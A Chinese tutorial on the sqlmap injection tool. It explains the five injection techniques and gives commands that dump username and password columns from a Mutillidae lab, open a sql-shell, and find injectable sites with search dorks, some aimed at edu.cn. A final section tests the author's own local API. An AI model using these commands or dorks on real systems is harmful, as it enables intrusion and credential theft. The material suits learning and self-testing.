# 一、sqlmap简介
SQLmap是一个国内外著名的安全稳定性测试工具，可以用来进行自动化检测，利用SQL注入漏洞，获取数据库服务器的权限。它具有功能强大的检测引擎，针对各种不同类型数据库的安全稳定性测试的功能选项，包括获取数据库中存储的数据，访问操作系统文件甚至可以通过外带数据连接的方式执行操作系统命令。

SQLmap支持Mysql，Oracle，PostgreSQL，Microsoft SQL Server，Microsoft Access，IBM DB2,SQLite，等数据库的各种安全漏洞检测。

sqlmap支持五种不同的注入模式：

- l 基于布尔的盲注，即可以根据返回页面判断条件真假的注入；

- l 基于时间的盲注，即不能根据页面返回内容判断任何信息，用条件语句查看时间延迟语句是否执行（即页面返回时间是否增加）来判断；

- l 基于报错注入，即页面会返回错误信息，或者把注入的语句的结果直接返回在页面中；

- l 联合查询注入，可以使用union的情况下的注入；

- l 堆查询注入，可以同时执行多条语句的执行时的注入。

## SQL支持五种不同的注入模式

- **布尔型盲注**：sqlmap 会替换或添加 SQL 语句到 HTTP 请求的查询参数里面，相关的 SQL 语句可能是合法的 `SELECT` 子查询，也可以是任意用于获取输出数据的 SQL 语句。针对每个注入检测的 HTTP 响应，sqlmap 通过对比原始请求响应的 headers/body，从而逐个字符地推导出注入语句的输出。或者，用户可以预先提供一个字符串或正则表达式，用于对正确页面结果进行匹配。sqlmap 内部实现了二分算法，使得输出中的每一个字符可在最多 7 个 HTTP 请求内被获取。如果请求响应结果不是简单的明文字符集，sqlmap 会采取更大范围的算法来检测输出。
- **时间型盲注**：sqlmap 会替换或者添加相关的 SQL 语句到 HTTP 请求的查询参数里面，相关的 SQL 语句可能是合法的、用于使后端 DBMS 延迟几秒响应的查询。针对每一个注入检测的 HTTP 响应，通过对 HTTP 响应时间与原始请求之间进行比较，从而逐个字符地推导出注入语句的输出。正如基于布尔型盲注的技术一样，二分算法也会被应用。
- **报错型注入**：sqlmap 会替换或者添加用于引发特定数据库错误的 SQL 语句到查询参数里面，并通过解析对应的注入结果，判断特定的数据库错误信息是否存在响应的 headers/body 中。这项技术只有在 Web 应用配置开启后端 DBMS 错误信息提醒才有效。
- **UNION 查询注入**：sqlmap 会在查询参数中添加以 `UNION ALL SELECT` 开头的合法 SQL 语句。当 Web 应用在 `for` 循环中直接传递 `SELECT` 语句的查询结果，或采用了类似的方法将查询结果在页面中逐行输出时，这项技术会生效。当查询结果不使用 `for` 循环进行全部输出而只输出首个结果，sqlmap 还能够利用**偏（单入口）UNION 查询 SQL 注入**漏洞。
- **堆叠查询注入**，也被称为**捎带查询注入（piggy backing）**：sqlmap 会测试 Web 应用是否支持堆叠查询，如果支持，则在 HTTP 请求的查询参数中添加一个分号（`;`），并在后面加上注入的 SQL 语句。这项技术不仅适用于执行 `SELECT` 语句，同样适用于执行**数据定义**或者**数据操作**等 SQL 语句，同时可能可以获取到文件系统的读写权限和系统命令执行权限，不过这很大程度上取决于底层 DBMS 和当前会话用户的权限。

## 通用特性

- 完全支持 **MySQL**，**Oracle**，**PostgresSQL**，**Microsoft SQL Server**，**Microsoft Access**，**IBM DB2**，**SQLite**，**Firebird**，**Sybase**，**SAP MaxDB** 和 **HSQLDB** 数据库管理系统。
- 完全支持五种 SQL 注入技术：**布尔型盲注**，**时间型盲注**，**报错型注入**，**UNION 查询注入**和**堆叠查询注入**。
- 支持通过提供 DBMS 凭证，IP 地址，端口和数据库名而非 SQL 注入**直接连接数据库**。
- 支持用户提供单个目标 URL，通过 [Burp proxy](http://portswigger.net/suite/) 或 [WebScarab proxy](http://www.owasp.org/index.php/Category:OWASP_WebScarab_Project) 的请求日志文件批量获取目标地址列表，从文本文件获得完整的 HTTP 请求报文或使用 Google dork——使用 [Google](http://www.google.com/) 查询并解析结果页面获取批量目标。也可以自定义正则表达式进行验证解析。
- 可以测试并利用 **GET** 和 **POST** 参数，HTTP 头中的 **Cookie**，**User-Agent** 和 **Referer** 这些地方出现的 SQL 注入漏洞。也可以指定一个用英文逗号隔开的参数列表进行测试。
- 支持自定义**最大 HTTP(S) 并发请求数（多线程）**以提高盲注的速度。同时，还可以设置每个 HTTP(S) 请求的间隔时间（秒）。当然，还有其他用来提高测试速度的相关优化选项。
- 支持设置 **HTTP 头中的** `Cookie`，当你需要为基于 cookies 身份验证的目标 Web 应用提供验证凭证，或者是你想要对 cookies 这个头部参数进行测试和利用 SQL 注入时，这个功能是非常有用的。你还可以指定对 Cookie 进行 URL 编码。
- 自动处理来自 Web 应用的 **HTTP** `Set-Cookie` 消息，并重建超时过期会话。这个参数也可以被测试和利用。反之亦然，你可以强制忽略任何 `Set-Cookie` 消息头信息。
- 支持 HTTP **Basic，Digest，NTLM 和 Certificate authentications** 协议。
- **HTTP(S)** 代理支持通过使用验证代理服务器对目标应用发起请求，同时支持 HTTPS 请求。
- 支持伪造 **HTTP** `Referer` 和 **HTTP** `User-Agent`，可通过用户或者从一个文本文件中随机指定。
- 支持设置**输出信息的详细级别**：共有**七个级别**的详细程度。
- 支持从目标 URL 中**解析 HTML 表单**并伪造 HTTP(S) 请求以测试这些表单参数是否存在漏洞。
- 通过用户设置选项调整**粒度和灵活性**。
- 对每一次查询实时**评估完成时间**，使用户能知道输出结果需要的大概时长。
- 在抓取数据时能实时自动保存会话（对应查询和输出结果，支持部分获取保存）到一个文本文件中，并通过解析会话文件**继续当前进行的注入检测**。
- 支持从 INI 配置文件中读取相关配置选项而不是每次都要在命令行中指定。支持从命令行中生成对应的配置文件。
- 支持**复制后端数据库表结构和数据项**到本地的 SQLite 3 数据库中。
- 支持从 SVN 仓库中将 sqlmap 升级到最新的开发版本。
- 支持解析 HTTP(S) 请求响应并显示相关的 DBMS 错误信息。
- 集成其他 IT 安全开源项目，[Metasploit](http://metasploit.com/) 和 [w3af](http://w3af.sourceforge.net/)。



## 1.1 sqlmap 参数解析
```
--users       # 查看所有用户
--current-user   # 查看当用户
--dbs         # 查看所有数据库
--current-db   # 查看当前数据库
-D “database_name” --tables  # 查看表
-D “database_name” -T “table_name” --columns  # 查看表的列

--dump -all
--dump-all --exclude-sysdbs
-D “database_name” -T “table_name” --dump
-D “database_name” -T “table_name” -C “username,password” --dump

--batch  # 自动化完成
```

# 二、sqlmap自动化注入
 - GET方法注入
 - Post方式注入
 - 数据获取
 - 提权操作

## 2.4 提权操作
与数据库交互--sql-shell
```bash
sqlmap -u “http://192.168.xxx.xxx/test/?id=1” --cookie=”SESSIONID=xxxxxx;security=low;showhints=1”; acopendivids=swingset,jotto;acgroupswithpersist=nada” --batch --sql-shell

# 进入到了sql-shell命令行方式
sql-shell> select * from users;
```

## 示例步骤：
### 1.获得当前数据库
```bash
sqlmap -u “http://192.168.xx.xx/mutillidae/index.php?page=user-info.php&username=test&password=123&user-info-php-submit-button=View+Account+Details” --batch --current-db
```

### 2.获得数据库表
```bash
sqlmap -u “http://192.168.xx.xx/mutillidae/index.php?page=user-info.php&username=test&password=123&user-info-php-submit-button=View+Account+Details” --batch -D database --tables
```

### 3.获得表的字段
```bash
sqlmap -u “http://192.168.xx.xx/mutillidae/index.php?page=user-info.php&username=test&password=123&user-info-php-submit-button=View+Account+Details” --batch -D database -T accounts --columns
```

### 4.获得表中的数据
```bash
sqlmap -u “http://192.168.xx.xx/mutillidae/index.php?page=user-info.php&username=test&password=123&user-info-php-submit-button=View+Account+Details” --batch -D database -T accounts -C "username,password" --dump
```

## 综合示例
### 1.通过google搜索可能存在注入的页面
```
inurl:.php?id=
inurl:.jsp?id=
inurl:.asp?id=
inurl:/admin/login.php
inurl:.php?id= intitle:美女
```
### 2.通过百度搜索可能存在注入的页面
```
inurl:news.asp?id= site:edu.cn
inurl:news.php?id= site:edu.cn
inurl:news.aspx?id= site:edu.cn
```

# 三、SQLMap实践

参考链接：简书：作者：虫儿飞ZLEI
链接：https://www.jianshu.com/p/3d3656be3c60



## 3.1 使用本地网站

### 3.1.1 本地网站是本地的项目，现在用本地的项目跑起来来测试sqlmap

主要测试三个url：
 [http://localhost:9099/tjcx/qyzxcx/zscq/sbxx/years?nsrsbh='1234000048500077X3'](https://links.jianshu.com/go?to=http%3A%2F%2Flocalhost%3A9099%2Ftjcx%2Fqyzxcx%2Fzscq%2Fsbxx%2Fyears%3Fnsrsbh%3D'1234000048500077X3')
 [http://localhost:9099/record/user/2019-03-09](https://links.jianshu.com/go?to=http%3A%2F%2Flocalhost%3A9099%2Frecord%2Fuser%2F2019-03-09)
 127.0.0.1:9099/open/qyxx/jcsj_gs?nsrsbh=110101717802684



### 3.1.2 操作--url1

> url1：[http://localhost:9099/tjcx/qyzxcx/zscq/sbxx/years?nsrsbh='1234000048500077X3'](https://links.jianshu.com/go?to=http%3A%2F%2Flocalhost%3A9099%2Ftjcx%2Fqyzxcx%2Fzscq%2Fsbxx%2Fyears%3Fnsrsbh%3D'1234000048500077X3')，这是一个post请求，nsrsbh是所需要的参数



执行：

```bash
python2 sqlmap.py -u "http://localhost:9099/tjcx/qyzxcx/zscq/sbxx/years?nsrsbh='1234000048500077X3'"  --method=POST
```

可以看到，没有访问到正确的连接，而是被重定向到了登陆的login页面，这是因为这个网站需要登陆，没有登陆的情况访问链接就会被重定向到登陆页面，所以在这里现在浏览器中登陆，然后拿到浏览器的cookie，让sqlmap携带着cookie再去攻击



![img](https:////upload-images.jianshu.io/upload_images/6262743-6154ade96f84d1f6.png?imageMogr2/auto-orient/strip|imageView2/2/w/968/format/webp)

> 拿到浏览器的cookie

![img](https:////upload-images.jianshu.io/upload_images/6262743-e4e8e0e63f37f2fe.png?imageMogr2/auto-orient/strip|imageView2/2/w/457/format/webp)

执行(携带cookie)：

```bash
python2 sqlmap.py -u "http://localhost:9099/tjcx/qyzxcx/zscq/sbxx/years?nsrsbh='1234000048500077X3'" --cookie="JSESSIONID=9446902e-703b-4c81-914a-9abbd90ed9ce" --method=POST
```

执行结果：可以看到，并没有找到可以注入的地方



![img](https:////upload-images.jianshu.io/upload_images/6262743-b70261cacd092e99.png?imageMogr2/auto-orient/strip|imageView2/2/w/953/format/webp)



观察这个网站的日志，也可以看到，这个接口被调用很多次，都是sqlmap自动调用的，它在尝试寻找可以注入的地方



![img](https:////upload-images.jianshu.io/upload_images/6262743-d855c87b93f352e1.png?imageMogr2/auto-orient/strip|imageView2/2/w/1183/format/webp)

image.png

### 3.1.3 操作--url2

> url2:[http://localhost:9099/record/user/2019-03-09](https://links.jianshu.com/go?to=http%3A%2F%2Flocalhost%3A9099%2Frecord%2Fuser%2F2019-03-09),这是一个get请求，2019-03-09是restful风格的参数

同样携带cookie执行：



```bash
python2 sqlmap.py -u "http://localhost:9099/record/user/2019-03-09" --cookie="JSESSIONID=9446902e-703b-4c81-914a-9abbd90ed9ce" --method=GET
```

执行结果，没有发现可以注入的地方



![img](https:////upload-images.jianshu.io/upload_images/6262743-24ab5ba7406d376c.png?imageMogr2/auto-orient/strip|imageView2/2/w/977/format/webp)

查看网站后台，接口同样被调用多次

![img](https:////upload-images.jianshu.io/upload_images/6262743-41ecd7cb961152ac.png?imageMogr2/auto-orient/strip|imageView2/2/w/1200/format/webp)

### 3.1.4 操作--url3

> url3:127.0.0.1:9099/open/qyxx/jcsj_gs?nsrsbh=110101717802684，这也是一个get请求，但是不同的是，这个接口不需要cookie就可以访问，但是需要携带正确的header才可以执行

携带header执行：



```bash
python2 sqlmap.py -u "127.0.0.1:9099/open/qyxx/jcsj_gs?nsrsbh=110101717802684"  --method=GET --headers="type:pwd\nchannelPwd:f1e7e7f187f84cdfb4784481ed01abd5\nchannelId:FDDX_PWD"
```

执行结果，没有找到可以注入的地方



![img](https:////upload-images.jianshu.io/upload_images/6262743-3c79558b28ac6822.png?imageMogr2/auto-orient/strip|imageView2/2/w/970/format/webp)

查看后台，接口同样被调用多次



![img](https:////upload-images.jianshu.io/upload_images/6262743-fe012f298928b4de.png?imageMogr2/auto-orient/strip|imageView2/2/w/1200/format/webp)

## 3.2 总结

简单的使用就是这样，需要一个url，有的可能需要携带cookie，有的可能需要携带header，
 如果找到了注入点，就可以拿到一些数据信息，但是现在的网站通常也比较难找到可以注入的url。
 可以通过这种方式来检测自己写的接口是否有被sql注入的风险





